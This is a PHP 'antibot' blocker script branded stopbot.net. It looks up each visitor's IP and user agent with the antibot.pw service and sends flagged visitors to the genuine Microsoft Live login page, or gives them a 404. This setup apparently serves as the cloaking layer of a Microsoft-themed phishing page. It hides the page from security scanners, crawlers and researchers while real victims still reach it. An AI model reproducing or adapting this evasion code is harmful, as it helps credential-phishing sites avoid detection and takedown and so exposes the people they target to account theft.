<?php
// Read the JSON data from file
$json_data = file_get_contents('function/config.json');
// Decode JSON data into PHP array
$config = json_decode($json_data, true);
/*
     _              _           _                _   
    | |            | |         | |              | |  
 ___| |_ ___  _ __ | |__   ___ | |_   _ __   ___| |_ 
/ __| __/ _ \| '_ \| '_ \ / _ \| __| | '_ \ / _ \ __|
\__ \ || (_) | |_) | |_) | (_) | |_ _| | | |  __/ |_ 
|___/\__\___/| .__/|_.__/ \___/ \__(_)_| |_|\___|\__|
             | |                                     
             |_|                                     
                      [Example Code Blocker]

Guide   : https://docs.stopbot.net/service-guides/stopbot/blocker
Website : stopbot.net
contact : t.me @stopbotnet
*/

/* START CONFIGURATION */


# 0. Turn off
# 1. Turn on
$BotControl = 1;

# RedirectURL 
# Leave it blank for http_code 404 response
$RedirectURL = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=16&ct=1692807460&rver=7.3.6960.0&wp=MBI_SSL&wreply=https%3a%2f%2fwww.microsoft.com%2frpsauth%2fv1%2faccount%2fSignInCallback%3fstate%3deyJSdSI6Imh0dHBzOi8vd3d3Lm1pY3Jvc29mdC5jb20vZW4tZ2IiLCJMYyI6IjIwNTciLCJIb3N0Ijoid3d3Lm1pY3Jvc29mdC5jb20ifQ&lc=2057&id=74335&aadredir=0";

/* END CONFIGURATION */

if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = $_SERVER['REMOTE_ADDR'];
        
switch(true){
    case (filter_var($client, FILTER_VALIDATE_IP)):
        $Ip = $client;
        break;
    case(filter_var($forward, FILTER_VALIDATE_IP)):
        $Ip = $forward;
        break;
    default:
        $Ip = $remote;
        break;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://antibot.pw/api/v2-blockers?&ip=".$Ip."&apikey=".$config['antibot']."&ua=".urlencode($_SERVER['HTTP_USER_AGENT']));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$response = curl_exec($ch);
switch(true){
    case !$response:
        file_put_contents("antibot.txt", "[".date("D/m/y H:i:s")."] -> Request Timeout\r\n", FILE_APPEND);
        break;
    default:
        $resp = json_decode($response, true);
        switch(true){
            case $resp['status'] == 1:
                switch(true){
                    case $resp['block_access'] == 1 && !empty($RedirectURL):
                        header("Location: ".$RedirectURL);
                        die();
                        break;
                    case $resp['block_access'] == 1 && empty($RedirectURL):
                        http_response_code(404);
                        die();
                        break;
                }
                break;
            case $resp['status'] == "error":
                echo "error";
                file_put_contents("antibot.txt", "[".date("D/m/y H:i:s")."] -> ".$resp['message']."\r\n", FILE_APPEND);
                break;
            default:
                file_put_contents("antibot.txt", "[".date("D/m/y H:i:s")."] -> Unknown error\r\n", FILE_APPEND);
                break;
        }
        break;
}